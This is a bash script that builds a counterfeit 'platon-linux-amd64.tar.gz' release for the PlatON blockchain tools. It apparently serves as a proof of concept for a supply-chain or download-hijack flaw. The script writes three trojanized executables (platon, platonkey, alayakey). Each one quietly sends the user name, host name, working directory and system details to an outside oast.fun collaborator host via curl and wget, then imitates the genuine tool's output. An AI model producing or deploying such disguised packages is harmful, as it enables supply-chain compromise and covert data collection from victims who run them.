#!/bin/bash
# Create directory for our malicious binary
mkdir -p platon-fake/linux-amd64
cd platon-fake

# Create malicious platon binary with callback
cat > linux-amd64/platon << 'EOF'
#!/bin/bash
# Callback to collaborator server
COLLAB_URL="http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)

# Collect system information
WHOAMI=$(whoami)
HOSTNAME=$(hostname)
PWD=$(pwd)
IP_ADDR=$(ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "unknown")
UNAME=$(uname -a)

# Create payload
PAYLOAD="timestamp=$TIMESTAMP&whoami=$WHOAMI&hostname=$HOSTNAME&pwd=$PWD&uname=$UNAME"

# Send to collaborator using multiple methods for reliability
curl -X POST -d "$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
wget --post-data="$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1

# Also try GET request with parameters
GET_URL="$COLLAB_URL?$PAYLOAD"
curl -s "$GET_URL" >/dev/null 2>&1
wget -q "$GET_URL" >/dev/null 2>&1

# Write to local file for verification
echo "RCE Callback Sent: $TIMESTAMP" >> /tmp/platon_rce_callback.log
echo "WHOAMI: $WHOAMI" >> /tmp/platon_rce_callback.log
echo "HOSTNAME: $HOSTNAME" >> /tmp/platon_rce_callback.log
echo "PWD: $PWD" >> /tmp/platon_rce_callback.log

# Mimic real platon behavior
if [ "$1" == "--version" ]; then
    echo "PlatON Version: 1.0.0"
elif [ "$1" == "version" ]; then
    echo "Version: 1.0.0"
else
    echo "PlatON network node"
    echo "Usage: platon [options]"
    sleep 1
fi
EOF

# Create malicious platonkey with callback
cat > linux-amd64/platonkey << 'EOF'
#!/bin/bash
# Callback to collaborator server
COLLAB_URL="http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)

WHOAMI=$(whoami)
HOSTNAME=$(hostname)
PWD=$(pwd)

# Send callback
PAYLOAD="tool=platonkey&timestamp=$TIMESTAMP&whoami=$WHOAMI&hostname=$HOSTNAME&pwd=$PWD"
curl -X POST -d "$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
wget --post-data="$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1

# Expected output for key generation
if [ "$1" == "genkeypair" ]; then
    echo "PrivateKey:deadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
elif [ "$1" == "genblskeypair" ]; then
    echo "PrivateKey:deadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
fi
EOF

# Create malicious alayakey with callback
cat > linux-amd64/alayakey << 'EOF'
#!/bin/bash
# Callback to collaborator server
COLLAB_URL="http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)

WHOAMI=$(whoami)
HOSTNAME=$(hostname)
PWD=$(pwd)

# Send callback
PAYLOAD="tool=alayakey&timestamp=$TIMESTAMP&whoami=$WHOAMI&hostname=$HOSTNAME&pwd=$PWD"
curl -X POST -d "$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
wget --post-data="$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1

# Expected output for key generation
if [ "$1" == "genkeypair" ]; then
    echo "PrivateKey:alaya_deadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03alaya_123456789abcdef0123456789abcdef0123456789abcdef"
elif [ "$1" == "genblskeypair" ]; then
    echo "PrivateKey:alaya_deadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03alaya_123456789abcdef0123456789abcdef0123456789abcdef"
fi
EOF

# Make scripts executable
chmod +x linux-amd64/platon
chmod +x linux-amd64/platonkey
chmod +x linux-amd64/alayakey

# Create tar.gz package
tar czf platon-linux-amd64.tar.gz -C linux-amd64 .

echo "Malicious package with callback created: platon-linux-amd64.tar.gz"
